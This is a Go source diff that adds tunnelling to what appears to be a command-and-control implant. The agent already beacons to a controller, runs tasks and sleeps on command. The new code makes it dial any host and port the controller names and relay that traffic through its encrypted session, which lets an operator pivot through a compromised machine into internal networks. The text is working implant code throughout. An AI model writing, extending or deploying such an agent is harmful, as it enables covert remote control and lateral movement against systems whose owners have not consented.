@@ -112,10 +112,9 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 	}
 
 	// --- initial beacon ---
-	var writeMu sync.Mutex
 	send := func(t proto.MessageType, payload any) error {
-		writeMu.Lock()
-		defer writeMu.Unlock()
+		sendMu.Lock()
+		defer sendMu.Unlock()
 		return sendEncrypted(conn, sess, t, payload)
 	}
 	if err := send(proto.TypeBeacon, proto.Beacon{
@@ -182,6 +181,24 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 			if err := send(proto.TypeResult, result); err != nil {
 				return fmt.Errorf("send result: %w", err)
 			}
+		case proto.TypeTunnelOpen:
+			var t proto.TunnelOpen
+			if err := json.Unmarshal(env.Payload, &t); err != nil {
+				continue
+			}
+			go handleTunnelOpen(conn, sess, t)
+		case proto.TypeTunnelData:
+			var t proto.TunnelData
+			if err := json.Unmarshal(env.Payload, &t); err != nil {
+				continue
+			}
+			routeInboundTunnelData(&t)
+		case proto.TypeTunnelClose:
+			var t proto.TunnelClose
+			if err := json.Unmarshal(env.Payload, &t); err != nil {
+				continue
+			}
+			closeTunnel(&t)
 		case proto.TypeSleep:
 			var s proto.Sleep
 			_ = json.Unmarshal(env.Payload, &s)
@@ -279,4 +296,93 @@ func runFrameworkTask(t proto.Task) proto.Result {
 		Stderr:   func() string { if r.Err != nil { return r.Err.Error() }; return "" }(),
 		ExitCode: r.ExitCode,
 	}
+}
+
+
+// --- tunnels ---
+
+var sendMu sync.Mutex
+
+type agentTunnel struct {
+	conn net.Conn
+	done chan struct{}
+}
+
+var (
+	activeTunnels   = map[string]*agentTunnel{}
+	activeTunnelsMu sync.Mutex
+)
+
+func handleTunnelOpen(rwc net.Conn, sess *crypto.Session, t proto.TunnelOpen) {
+	target := fmt.Sprintf("%s:%d", t.Host, t.Port)
+	c, err := net.DialTimeout("tcp", target, 10*time.Second)
+	if err != nil {
+		sendTunnelAck(rwc, sess, proto.TypeTunnelFail, proto.TunnelFail{
+			TunnelID: t.TunnelID, Error: err.Error(),
+		})
+		return
+	}
+	at := &agentTunnel{conn: c, done: make(chan struct{})}
+	activeTunnelsMu.Lock()
+	activeTunnels[t.TunnelID] = at
+	activeTunnelsMu.Unlock()
+
+	log.Printf("tunnel %s -> %s", t.TunnelID, target)
+	sendTunnelAck(rwc, sess, proto.TypeTunnelReady, proto.TunnelReady{TunnelID: t.TunnelID})
+
+	// read from target -> send tunnel_data to core
+	go func() {
+		defer func() {
+			activeTunnelsMu.Lock()
+			delete(activeTunnels, t.TunnelID)
+			activeTunnelsMu.Unlock()
+			c.Close()
+		}()
+		buf := make([]byte, 16*1024)
+		for {
+			n, err := c.Read(buf)
+			if n > 0 {
+				sendTunnelAck(rwc, sess, proto.TypeTunnelData, proto.TunnelData{
+					TunnelID: t.TunnelID, Data: buf[:n],
+				})
+			}
+			if err != nil {
+				sendTunnelAck(rwc, sess, proto.TypeTunnelData, proto.TunnelData{
+					TunnelID: t.TunnelID, EOF: true,
+				})
+				return
+			}
+		}
+	}()
+}
+
+func routeInboundTunnelData(t *proto.TunnelData) {
+	activeTunnelsMu.Lock()
+	at := activeTunnels[t.TunnelID]
+	activeTunnelsMu.Unlock()
+	if at == nil {
+		return
+	}
+	if len(t.Data) > 0 {
+		_, _ = at.conn.Write(t.Data)
+	}
+	if t.EOF {
+		at.conn.Close()
+	}
+}
+
+func closeTunnel(t *proto.TunnelClose) {
+	activeTunnelsMu.Lock()
+	at := activeTunnels[t.TunnelID]
+	delete(activeTunnels, t.TunnelID)
+	activeTunnelsMu.Unlock()
+	if at != nil {
+		at.conn.Close()
+	}
+}
+
+func sendTunnelAck(conn net.Conn, sess *crypto.Session, t proto.MessageType, payload any) {
+	sendMu.Lock()
+	defer sendMu.Unlock()
+	_ = sendEncrypted(conn, sess, t, payload)
 }
